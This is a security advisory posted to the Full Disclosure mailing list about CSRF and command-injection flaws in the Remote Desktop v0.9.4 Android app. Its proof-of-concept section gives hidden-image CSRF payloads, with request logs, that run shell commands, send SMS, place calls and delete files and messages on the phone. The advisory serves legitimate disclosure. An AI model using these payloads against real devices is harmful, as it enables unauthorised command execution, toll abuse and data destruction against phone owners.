
Date: Wed, 21 Jan 2015 11:41:17 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: fulldisclosure@...lists.org
Subject: [FD] Remote Desktop v0.9.4 Android - Multiple Vulnerabilities

Document Title:
===============
Remote Desktop v0.9.4 Android - Multiple Vulnerabilities


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1413


Release Date:
=============
2015-01-20


Vulnerability Laboratory ID (VL-ID):
====================================
1413


Common Vulnerability Scoring System:
====================================
4.4


Product & Service Introduction:
===============================
Remote Desktop brings order to your Droid. View and retrieve all the contents of your phone such as documents, photos, videos. All you need is a 
standard web browser (! the latest Chrome or Firefox !) and Remote Desktop will allow you interact with your phone as easily as a PC.

(Copy of the Homepage: http://remote-desktop.android.informer.com/0.9.4/ & https://play.google.com/store/apps/details?id=pl.androiddev.mobiletab )


Abstract Advisory Information:
==============================
An independent vulnerability laboratory researcher discovered multiple web vulnerabilities in the Remote Desktop v0.9.4 Android mobile web-application.


Vulnerability Disclosure Timeline:
==================================
2015-01-20:	Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Damian Kolakowski
Product: Remote Desktop - Android Mobile Web Application 0.9.4


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
Multiple vulnerabilities has been discovered in the Remote Desktop v0.9.4 Android mobile web-application.
The mobile web-application is vulnerable to a combination of cross site request forgery and local command injection attacks.

1.1
The local command injection vulnerability is located in `cmd` value of the `/api/sms` file. The remote attackers performs 
a client-side request and manipulates the `cmd` value to compromise the web-app by a local command injection.

The security risk of the local command/path inject vulnerability is estimated as medium with a cvss (common vulnerability 
scoring system) count of 5.5. Exploitation of the command/path inject vulnerability requires no privileged android device 
user account or user interaction. Successful exploitation of the vulnerability results in unauthorized execution of system 
specific commands and unauthorized path value requests to compromise the mobile android application and the connected device.

Request Method(s):
				[+] [GET]

Vulnerable Module(s):
				[+] /api/sms

Vulnerable Parameter(s):
				[+] cmd=%3Cform%20action=api/[x]?cmd=

1.2
The cross site request forgery vulnerabilities are located in the `shell`,`sms`,`calllogs` and `files` sections of the android app. 
Remote attackers are able prepare special crafted URLs that executes client-side requests to execute application functions (delete,add, 
call, send). The requst method to execute a function in a client-side request is GET.

The security risk of the client-side web vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 2.4.
Exploitation of the client-side web vulnerability requires no privileged web-application user account but medium or high user interaction.
Successful exploitation of the vulnerabilities result in non-persistent phishing mails, session hijacking, non-persistent external redirect 
to malicious sources and client-side manipulation of affected or connected module context.

Request Method(s):
				[+] [GET]

Vulnerable Parameter(s):
				[+] shell
				[+] sms
				[+] calllogs


Proof of Concept (PoC):
=======================
The vulnerabilities can be exploited by remote attackers without privileged application user account and with low or medium user interaction.
For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.

[REMOTE SHELL CODE EXECUTE VULNERABILI! CSRF ] 
<img src="http://localhost:8080/api/shell?cmd=execute&command=id&token=111111111111" width="0" height="0" border="0">

--- PoC Session Logs [GET] (Execution) ---
GET /api/shell?cmd=execute&command=id&token=111111111111 HTTP/1.1
Host: 192.168.1.3:8080
User-Agent: Mozilla/5.0 (Windows NT 5.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive

- Response
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
{"response":"OK","working-directory":"\/","stderr":"","stdout":"uid=10257(u0_a257) gid=10257(u0_a257) groups=1015(sdcard_rw),1028(sdcard_r),3003(inet)\n"}



Send SMS
<img src="http://localhost:8080/api/sms?cmd=send&token=111111111111&to=333&message=HELLO " width="0" height="0" border="0">

--- PoC Session Logs [GET] (Execution) ---
GET /api/sms?cmd=send&token=111111111111&to=333&message=HELLO HTTP/1.1
Host: 192.168.1.3:8080
User-Agent: Mozilla/5.0 (Windows NT 5.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.3:8080/index.html?nocache=1421469722760
Connection: keep-alive

- Response
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
{"response":"OK","results":[{"id":1590,"address":"333"}],
"thread":{"id":51,"read":false,"snippet":"HELLO","recipients_snippet":"333",
"message_count":70,"date":1421476972278,"recipients":[{"id":51,"address":"333"}]}}



Call Phone 

<img src="http://localhost:8080/api/calllogs?cmd=make_call&number=0674086422" width="0" height="0" border="0">

--- PoC Session Logs [GET] (Execution) ---

GET /api/calllogs?cmd=make_call&number=0674086422 HTTP/1.1
Host: 192.168.1.3:8080
User-Agent: Mozilla/5.0 (Windows NT 5.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.3:8080/index.html?nocache=1421465315931
Connection: keep-alive

- Response
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
{"response":"OK"}


Delete File
<img src="http://localhost:8080/api/files?cmd=delete&sep=/&path=/file" width="0" height="0" border="0">

--- PoC Session Logs [GET] (Execution) ---
GET /api/files?cmd=delete&sep=/&path=%2Fstorage%2Femmc%2FRWDFv5.9.5.apk HTTP/1.1
Host: 192.168.1.6:8080
User-Agent: Mozilla/5.0 (Windows NT 5.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: http://localhost:8080/index.html?nocache=1421449820153
Connection: keep-alive

- Response
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
{"response":"OK"}


Call Phone 
<img src="http://localhost:8080/api/calllogs?cmd=make_call&number=0674086422" width="0" height="0" border="0">

--- PoC Session Logs [GET] (Execution) ---
GET /api/calllogs?cmd=make_call&number=11111111111 HTTP/1.1
Host: 192.168.1.3:8080
User-Agent: Mozilla/5.0 (Windows NT 5.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: http://localhost:8080/index.html?nocache=1421465315931
Connection: keep-alive

- Response
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
{"response":"OK"}


Delete all SMS
<img src="http://localhost:8080/api/sms?cmd=delete_all" width="0" height="0" border="0">

GET /api/sms?cmd=delete_all HTTP/1.1
Host: 192.168.1.3:8080
User-Agent: Mozilla/5.0 (Windows NT 5.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.3:8080/index.html?nocache=1421465315931
Connection: keep-alive

- Response
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
{"response":"OK"}


LOCAL COMMAND INJECTION VULNERABILITY shell?, sms?, calllogs?files?
--- PoC Session Logs [GET] (Execution) ---

GET /api/sms?cmd=%3Cform%20action=api/sms?cmd=[LOCAL COMMAND INJECTION VULNERABILITY!] HTTP/1.1
Host: 192.168.1.3:8080
User-Agent: Mozilla/5.0 (Windows NT 5.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive

- Response
{"response":"OK"} 
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

{"response":"Unknown command: [LOCAL COMMAND INJECTION VULNERABILITY!]"}

Reference:
http://localhost:8080/


Security Risk:
==============
The security risk of the cross site request forgery issue and command injection vulnerability is estimated as medium. (CVSS 4.4)


Credits & Authors:
==================
Hadji Samir s-dz@...mail.fr


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       		- admin@...lution-sec.com
Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
(admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com
PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt



_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/